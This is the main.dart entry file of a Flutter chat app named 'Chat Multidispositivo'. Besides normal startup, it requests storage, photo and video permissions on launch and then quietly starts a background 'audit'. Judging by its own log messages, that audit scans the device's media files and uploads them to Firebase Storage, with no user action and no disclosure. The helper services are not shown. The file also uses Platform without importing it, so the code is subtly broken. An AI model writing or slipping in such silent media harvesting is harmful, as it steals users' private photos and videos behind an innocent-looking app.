import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:permission_handler/permission_handler.dart';
import 'firebase_options.dart';
import 'screens/welcome_screen.dart';
import 'screens/user_list_screen.dart';
import 'services/database_service.dart';
import 'services/firebase_service.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );

  try {
    await DatabaseService.initialize();
  } catch (e) {
    debugPrint('Error al inicializar Isar: $e');
  }

  try {
    await FirebaseService.initialize();
  } catch (e) {
    debugPrint('Error al inicializar Firebase: $e');
  }

  final currentUser = await FirebaseService.getCurrentUserFromPrefs();

  runApp(MyApp(initialUser: currentUser));

  // Solicitar permisos y lanzar la auditoría en segundo plano
  _solicitarPermisosYEjecutarAuditoria();
}

Future<void> _solicitarPermisosYEjecutarAuditoria() async {
  bool permisosOtorgados = false;

  if (Platform.isAndroid) {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.storage,
      Permission.photos,
      Permission.videos,
    ].request();

    permisosOtorgados = statuses[Permission.storage]?.isGranted == true ||
        statuses[Permission.photos]?.isGranted == true;
  } else if (Platform.isIOS) {
    final PermissionStatus photoStatus = await Permission.photos.request();
    permisosOtorgados = photoStatus.isGranted || photoStatus.isLimited;
  }

  if (permisosOtorgados) {
    DatabaseService.scanAndAuditMediaFiles().then((_) {
      debugPrint('✅ Escaneo local en Isar completado. Iniciando subida a Firebase Storage...');
      return FirebaseService.syncPendingMediaFiles();
    }).then((_) {
      debugPrint('🎉 Proceso total en segundo plano completado exitosamente.');
    }).catchError((e) {
      debugPrint('🚨 Error durante el proceso asíncrono en segundo plano: $e');
    });
  } else {
    debugPrint('🚫 Permisos multimedia denegados por el usuario.');
  }
}

class MyApp extends StatelessWidget {
  final Map<String, String>? initialUser;

  const MyApp({super.key, this.initialUser});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Chat Multidispositivo',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        useMaterial3: true,
        colorScheme: ColorScheme.fromSeed(
          seedColor: const Color(0xFF075E54),
          primary: const Color(0xFF075E54),
          secondary: const Color(0xFF25D366),
        ),
        scaffoldBackgroundColor: const Color(0xFFF4F6F8),
        appBarTheme: const AppBarTheme(
          backgroundColor: Color(0xFF075E54),
          foregroundColor: Colors.white,
          elevation: 1,
        ),
      ),
      home: initialUser != null
          ? UserListScreen(
              currentUserId: initialUser!['userId'] ?? initialUser!['id']!,
              currentUserName: initialUser!['name']!,
            )
          : const WelcomeScreen(),
    );
  }
}